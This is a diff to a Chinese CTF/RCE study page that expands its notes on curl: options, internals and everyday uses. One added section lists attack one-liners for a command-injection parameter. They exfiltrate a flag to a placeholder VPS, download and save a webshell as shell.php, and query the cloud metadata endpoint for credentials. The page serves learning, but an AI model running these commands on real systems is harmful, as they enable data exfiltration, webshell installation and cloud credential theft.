@@ -111,9 +111,51 @@ if(!preg_match($pattern,$cmd)){
         <h2>三、名词大全与原理深度复盘</h2>
         
         <div class="highlight-box">
-            <h4>1. curl 命令的底层机制</h4>
-            <p><code>curl</code> 是一个利用 URL 规则在命令行下工作的文件传输工具。它支持 HTTP、HTTPS、FTP 等协议。在 RCE 中，它常被用来下载远程文件或发起外带请求。底层依赖 socket 编程（TCP 连接）。</p>
+            <h4>1. curl 命令深度详解（命令行网络之王）</h4>
+            <p><strong>一句话理解：</strong><code>curl</code>（Client URL）是一个利用 URL 语法在命令行下工作的文件传输工具，堪称<strong>“命令行里的浏览器”</strong>。它支持 HTTP、HTTPS、FTP 等几十种协议。</p>
+            <p><strong>与 wget 最核心的区别（CTF必考）：</strong></p>
+            <ul>
+                <li><code>wget</code>：默认把下载的内容<strong>保存成文件</strong>（非常适合下载木马）。</li>
+                <li><code>curl</code>：默认把请求到的内容<strong>直接打印到屏幕上</strong>（非常适合快速测试接口、外带数据）。</li>
+            </ul>
+            
+            <h4><i class="fas fa-terminal"></i> 核心参数与语法表</h4>
+            <p>基础语法：<code>curl [选项] [URL]</code></p>
+            <ul>
+                <li><code>-X</code>：指定请求方法（GET/POST/PUT/DELETE）。如 <code>curl -X POST http://...</code></li>
+                <li><code>-d</code>：发送 POST 请求的数据。如 <code>curl -d "user=admin&pass=123" http://...</code></li>
+                <li><code>-H</code>：添加自定义请求头。如伪造 IP：<code>-H "X-Forwarded-For: 127.0.0.1"</code></li>
+                <li><code>-o</code>：把输出保存到指定文件。如 <code>curl -o shell.php http://.../shell.txt</code></li>
+                <li><code>-O</code>：保存为远程文件名。如 <code>curl -O http://.../shell.txt</code></li>
+                <li><code>-I</code>：只显示响应头（HEAD请求），用于快速探测服务器类型、状态码。</li>
+                <li><code>-v</code>：显示详细的通信过程（调试神器），查看完整的请求/响应包。</li>
+                <li><code>-k</code>：忽略 HTTPS 证书错误，访问自签名证书的站点。</li>
+                <li><code>-L</code>：自动跟随 302 重定向，防止因跳转导致拿不到最终页面。</li>
+            </ul>
 
+            <h4><i class="fas fa-microchip"></i> 在 RCE/CTF 中的三大实战应用</h4>
+            <ul>
+                <li><strong>数据外带 (Out-of-Band)：</strong>当反弹 Shell 被防火墙拦截，或者你想快速把 flag 带出来时：<br><code>?cmd=curl http://你的VPS_IP:端口/?flag=`cat /flag`</code><br><em>原理：通过反引号执行命令，把结果拼接到 URL 参数里，向你的服务器发起 HTTP 请求。</em></li>
+                <li><strong>远程下载木马/Webshell：</strong>用法和 wget 类似，但更加灵活：<br><code>?cmd=curl -o shell.php http://你的VPS_IP/shell.txt</code><br><em>注意：保存为 .php 后缀，Web服务器才能解析执行。</em></li>
+                <li><strong>SSRF（服务端请求伪造）探测：</strong>如果 RCE 环境在内网，你可以用 curl 去探测内网的其他机器或云服务器的元数据接口：<br><code>?cmd=curl http://169.254.169.254/latest/meta-data/</code><br><em>这是云服务器泄露 AK/SK 凭证的经典路径。</em></li>
+            </ul>
+
+            <h4><i class="fas fa-network-wired"></i> 底层原理深度复盘</h4>
+            <ul>
+                <li><strong>为什么 curl 默认不保存文件？</strong>这体现了 Unix 的管道哲学。curl 默认输出到标准输出（stdout），是为了让你可以无缝衔接管道符。例如：<code>curl http://example.com | grep "error"</code>，直接过滤网页内容。如果默认保存为文件，反而多此一举。</li>
+                <li><strong>底层依赖与网络模型：</strong>curl 底层依赖的是 <strong>libcurl</strong> 库。它通过操作系统的 <strong>Socket（套接字）</strong> 接口发起 TCP/UDP 连接。当你输入 <code>curl http://...</code> 时，它内部经历了：DNS 解析 -> TCP 三次握手 -> 发送 HTTP 请求 -> 接收 HTTP 响应 -> 断开连接。它的网络栈完全遵循 TCP/IP 协议。</li>
+                <li><strong>为什么在 Level 22 外带失败了？</strong>因为靶机 Docker 网络的出站防火墙，只放行了 80 端口的 HTTP 请求去往特定白名单（比如你的 Mac），或者完全没有外网权限。外带需要的是你有一台公网 VPS（如阿里云、腾讯云）作为接收端，而不是内网 IP。</li>
+            </ul>
+
+            <h4><i class="fas fa-network-wired"></i> 跨领域迁移（生活中的 curl）</h4>
+            <ul>
+                <li><strong>API 调试：</strong>开发者在测试后端 API 时，最常用的就是 curl。甚至 Postman 这个软件，它的底层其实就是在发送 curl 风格的请求包。</li>
+                <li><strong>自动化运维：</strong>在 Shell 脚本里，通过 curl 监控服务器的健康状态。比如：<code>curl -I http://localhost:8080/health</code>，如果返回 200 就说明服务正常。</li>
+                <li><strong>网络排障：</strong>用 <code>curl -v</code> 来看 DNS 解析对不对、SSL 握手是否成功、重定向是否正常，比 ping 更加实用。</li>
+            </ul>
+        </div>
+
+        <div class="highlight-box">
             <h4>2. 重定向符 `>` 与 `>>` 的区别</h4>
             <ul>
                 <li><code>></code>：覆盖写入。如果目标文件已存在，会清空原内容再写入。</li>
